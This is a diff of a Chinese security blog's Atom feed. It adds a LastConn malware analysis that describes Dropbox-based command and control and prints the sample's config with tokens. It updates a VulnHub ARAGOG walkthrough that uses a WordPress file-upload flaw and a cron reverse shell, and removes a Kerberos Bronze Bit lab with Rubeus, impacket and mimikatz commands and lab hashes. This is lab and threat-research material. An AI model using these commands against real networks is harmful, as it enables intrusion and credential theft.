@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-06-16T13:18:19.817Z</updated>
+  <updated>2021-06-19T17:55:03.732Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>LastConn 样本简陋分析</title>
+    <link href="http://422926799.github.io/posts/519d2f5e.html"/>
+    <id>http://422926799.github.io/posts/519d2f5e.html</id>
+    <published>2021-06-19T17:35:48.000Z</published>
+    <updated>2021-06-19T17:55:03.732Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;事件来源&quot;&gt;&lt;a href=&quot;#事件来源&quot; class=&quot;headerlink&quot; title=&quot;事件来源&quot;&gt;&lt;/a&gt;事件来源&lt;/h2&gt;&lt;p&gt;事件来源：&lt;a href=&quot;https://www.proofpoint.com/us/blog/threat-insigh</summary>
+      
+    
+    
+    
+    
+    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
+    
+  </entry>
+  
+  <entry>
     <title>vulnhub ARAGOG</title>
     <link href="http://422926799.github.io/posts/21b3e8d6.html"/>
     <id>http://422926799.github.io/posts/21b3e8d6.html</id>
     <published>2021-06-16T12:46:42.000Z</published>
-    <updated>2021-06-16T13:18:19.817Z</updated>
+    <updated>2021-06-16T13:18:25.393Z</updated>
     
     <content type="html"><![CDATA[<p>靶场链接:<a href="http://www.vulnhub.com/entry/harrypotter-aragog-102,688/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/16/2XcHoQ.png" alt=""></p><p>gobuster web扫描<br><img src="https://z3.ax1x.com/2021/06/16/2XcOWn.png" alt=""></p><p>访问/blog发现是个wordpress<br><img src="https://z3.ax1x.com/2021/06/16/2XgR7F.png" alt=""></p><p>需要添加hosts  (这里我已经添加了)<br><img src="https://z3.ax1x.com/2021/06/16/2X2FHS.png" alt=""></p><p>wpscan扫描wordpress<br>（存在wp-admin用户）<br><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>插件扫描,存在wp-file-manager插件，版本6.0</p><pre><code>wpscan --url http://aragog.hogwarts/blog -t 20 --plugins-detection aggressive</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>这个版本存在任意文件上传，利用该洞getshell即可<br><img src="https://z3.ax1x.com/2021/06/16/2XRCG9.png" alt=""></p><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/16/2XRix1.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到flag，并得知/home目录下查找ginny和hagrid98用户<br><img src="https://z3.ax1x.com/2021/06/16/2XRtIg.png" alt=""></p><p>原本以为/var/www/html下是存放wordpress的路径，查看后发现不是。最后在/usr/share/wordpress发现数据库配置文件</p><pre><code>find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot;find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot; | grep &quot;config&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XR4Q1.png" alt=""></p><p>查询数据库得到wp-admin用户的密码</p><pre><code>use wordpress;select * from wp_users;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XRjSA.png" alt=""></p><p>cmd5查询得到密码<br><img src="https://z3.ax1x.com/2021/06/16/2XWpef.png" alt=""></p><p>ssh撞密码得<br><img src="https://z3.ax1x.com/2021/06/16/2XWVln.png" alt=""></p><p>后续常规linux提权检测发现没有有用的东西，上pspy检测root权限的进程，最后发现有个定时任务执行/opt/.backup.sh<br><img src="https://z3.ax1x.com/2021/06/16/2XWBfH.png" alt=""></p><p>里面插入反弹shell等待即可获得root shell<br><img src="https://z3.ax1x.com/2021/06/16/2XW6Xt.png" alt=""></p><h2 id="wp-file-任意文件上传分析"><a href="#wp-file-任意文件上传分析" class="headerlink" title="wp-file 任意文件上传分析"></a>wp-file 任意文件上传分析</h2><p>漏洞点位于file manager的connector.minimal.php文件，具体路径在wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php<br><img src="https://z3.ax1x.com/2021/06/16/2XW7Xq.png" alt=""></p><p>首先实例化一个elFinderConnector对象，然后调用它的run()方法，跟进run()<br>跟进到FILES数据判断<br><img src="https://z3.ax1x.com/2021/06/16/2XfpcR.png" alt=""></p><p>最后调用exec函数进入到文件上传处理点<br><img src="https://z3.ax1x.com/2021/06/16/2XfAAO.png" alt=""></p><p>Upload函数（关键点是Content-Type类型存在image即进入文件保存）<br><img src="https://z3.ax1x.com/2021/06/16/2Xf8US.png" alt=""></p><p>详细分析链接:<a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216990</a></p>]]></content>
     
@@ -433,28 +455,6 @@
     
     
     <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</title>
-    <link href="http://422926799.github.io/posts/9cf32cdf.html"/>
-    <id>http://422926799.github.io/posts/9cf32cdf.html</id>
-    <published>2021-03-19T06:28:37.000Z</published>
-    <updated>2021-03-19T06:45:06.458Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p><p>域用户:<br>fwwr<br>joke</p><h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p><p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p><p>常规的约束委派利用:</p><pre><code>1. 得到约束委派机器的用户凭证2. 发现委派用户委派的目标机器3. 获取RC4利用</code></pre><p>powerview查看约束委派的机器:</p><pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p><p>Rubeus一条命令实现约束委派：</p><pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p><p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p><pre><code>privilege::debugsekurlsa::&quot;ekeys&quot;</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p><p>获取TGT导入smbexec连接</p><pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardableexport KRB5CCNAME=administrator.ccachesudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p><h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p><p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p><p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p><pre><code>Import-Module .\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p><p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p><p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p><pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dllGet-ADComputer AttackerService #确认机器账户已经被添加Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器</code></pre><p>验证用户是否成功委派到目标机器</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p><p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p><pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardableexport KRB5CCNAME=administrator.ccachepython3 psexec.py -no-pass -k one2008.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;该漏洞解决了两个问题&lt;br&gt;1.禁止协议转换/协议过渡&lt;br&gt;2.受保护的用户和敏感用户不能被委派&lt;br&gt;具体设置表现为DC上设置Servi</summary>
-      
-    
-    
-    
-    
-    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
     
   </entry>
   
